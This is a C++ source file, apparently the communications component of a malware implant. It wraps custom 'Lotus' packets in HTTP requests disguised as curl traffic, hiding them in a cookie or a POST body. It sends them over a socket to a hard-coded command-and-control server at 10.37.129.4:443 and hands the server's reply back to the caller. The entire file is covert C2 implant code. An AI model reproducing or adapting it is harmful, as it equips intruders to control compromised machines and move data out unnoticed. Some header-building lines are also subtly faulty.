#include "Comms.hpp"

#define EXPORT __attribute__((visibility("default")))

std::string buildGETRequestString(std::string lotusPacket) {
    std::ostringstream buf;

    buf << "GET / HTTP/1.1\n";
    buf << "User-Agent: curl 7.64.2\n";
    buf << "Accept: */*\n";
    buf << "Connection: close\n";
    buf << "Cookie: erp=" << lotusPacket;
    buf << "\n\n";

    return buf.str();
}

std::string buildPOSTRequestString(std::string lotusPacket) {
    std::ostringstream buf;

    buf << "POST / HTTP/1.1\n";
    buf << "User-Agent: curl 7.64.2\n";
    buf << "Accept: */*\n";
    buf << "Content-Length: " << std::to_string(lotusPacket.length()) << "\n";
    buf << "Content-Type: application/x-www-form-urlencoded\n\n";
    buf << lotusPacket;

    return buf.str();
}

void buildLotusHeader(unsigned char * head, int data_length, int key_length, unsigned char * instruction) {
    // magic bytes (4 bytes)
    memcpy(head, MAGIC_BYTES, sizeof(MAGIC_BYTES));

    // payload length (4 bytes)
    unsigned char payload_length[] = { (unsigned char)data_length };
    memcpy(&head[PAYLOAD_LENGTH_POS], payload_length, sizeof(payload_length));

    // key length (2 bytes)
    unsigned char key_length_char[] = { (unsigned char)key_length };
    memcpy(&head[KEY_LENGTH_POS], key_length_char, sizeof(key_length_char));

    memcpy(&head[INSTRUCTION_POS], instruction, sizeof(instruction));

    memcpy(&head[MARKER_1A_POS], MARKER_1, sizeof(MARKER_1));

    memcpy(&head[MARKER_2_POS], MARKER_2, sizeof(MARKER_2));

    memcpy(&head[MARKER_1B_POS], MARKER_1, sizeof(MARKER_1));

    memcpy(&head[MARKER_3_POS], MARKER_3, sizeof(MARKER_3));
}

EXPORT
void sendRequest(const char * type, const std::vector<unsigned char> data, unsigned char ** response, int ** response_length, unsigned char ** instruction) {
    char httpGET[] = "GET";
    char httpPOST[] = "POST";
    std::string requestBody;

    std::string key = "";

    unsigned char header[HEADER_LENGTH] = { 0 };
    buildLotusHeader(header, data.size(), key.length(), *instruction);
    std::vector<unsigned char> lotus_packet(header, header + HEADER_LENGTH);
    
    // append key after header
    lotus_packet.insert(lotus_packet.end(), key.begin(), key.end());
    
    lotus_packet.insert(lotus_packet.end(), data.begin(), data.end());

    // convert data to string for building HTTP request
    std::string lotus_packet_str(lotus_packet.begin(), lotus_packet.end());

    // build HTTP request string
    if (strcmp(type, httpGET) == 0) {
        std::cout << "[COMMS] Received data to GET: " + lotus_packet_str << std::endl;
        requestBody = buildGETRequestString(lotus_packet_str);
    }
    else if (strcmp(type, httpPOST) == 0) {
        std::cout << "[COMMS] Received data to POST: " + lotus_packet_str << std::endl;
        requestBody = buildPOSTRequestString(lotus_packet_str);
    }
    else {
        return;
    }

    // uncomment to overwrite the request string while C2 doesn't have HTTP request functionality
    requestBody = lotus_packet_str;

    // create socket
    std::string host = "10.37.129.4";
    int port = 443;
    
    int sock_connect_status, bytes_read, sock;
    struct sockaddr_in serv_addr;
    unsigned char buffer[RESP_BUFFER_SIZE] = { 0 };

    // send data to socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        std::cout << "[COMMS] Socket creation error" << std::endl;
        return;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);

    // convert IPv4 and IPv6 addresses from text to binary form
    if (inet_pton(AF_INET, &host[0], &serv_addr.sin_addr) <= 0) {
        std::cout << "[COMMS] Invalid address" << std::endl;
        return;
    }

    // connect to server
    if ((sock_connect_status = connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr))) < 0) {
        std::cout << "[COMMS] Connection Failed" << std::endl;
        return;
    }
    send(sock, requestBody.data(), requestBody.size(), 0);
    std::cout << "[COMMS] Message sent, attempting to read response..." << std::endl;

    // receive data from socket
    bytes_read = read(sock, buffer, RESP_BUFFER_SIZE);

    if (bytes_read < 0) {
        std::cout << "[COMMS] No response received" << std::endl;
        return;
    }

    // update response buffer and response length values for return to caller
    memcpy(*response, buffer, bytes_read);
    **response_length = bytes_read;
}
